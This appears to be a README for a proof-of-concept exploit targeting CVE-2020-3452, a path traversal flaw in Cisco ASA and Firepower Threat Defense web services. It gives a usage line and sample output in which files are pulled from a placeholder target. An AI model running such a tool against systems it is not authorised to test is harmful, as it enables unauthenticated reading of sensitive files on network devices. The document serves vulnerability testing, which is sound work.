# Cisco Adaptive Security Appliance Software and Firepower Threat Defense Software Web Services Path Traversal Vulnerability

# CVE-2020-3452

Usage: CVE-2020-3452.py https://target.com

Vulnerability description: A vulnerability in the web services interface of Cisco Adaptive Security Appliance (ASA) Software and Cisco Firepower Threat Defense (FTD) Software could allow an unauthenticated, remote attacker to conduct directory traversal attacks and read sensitive files on a targeted system.

Sample output:
```
➜  Cisco-ASA-FTD-Web-Services-Traversal git:(main) ✗ python CVE-2020-3452.py https://target
+-------------------------------------------------------------+

- [ Cisco ASA / FTD Web Services Traversal Vulnerability ]

-       -[ CVE-2020-3452 - PoC by: LiquidSky ^_^ ]-

+-------------------------------------------------------------+
[*] Checking potential target : https://target
[+] https://target is vulnerable... 
[+] Grabbing logo.gif from the host.
[+] https://target is vulnerable... 
[+] Grabbing http_auth.html from the host.
[+] https://target is vulnerable...
```
